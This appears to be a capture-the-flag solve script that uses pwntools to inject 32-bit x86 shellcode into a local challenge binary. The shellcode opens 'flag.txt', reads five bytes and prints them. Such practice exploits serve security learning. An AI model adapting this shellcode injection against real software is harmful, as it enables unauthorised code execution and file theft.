from pwn import *
context.log_level="DEBUG"
context.binary = './chall32'
r = process("./chall32")
r.sendline(asm("""
xor eax, eax
push eax
push 0x7478742e
push 0x67616c66
mov ebx, esp
mov eax, 5
mov ecx, 0
int 0x80

mov ebx, eax
mov eax, 3
mov ecx, esp
mov edx, 5
int 0x80

mov ebx, 1
mov ecx, esp
mov eax, 4
mov edx, 5
int 0x80

mov eax, 1
int 0x80
"""))
r.interactive()
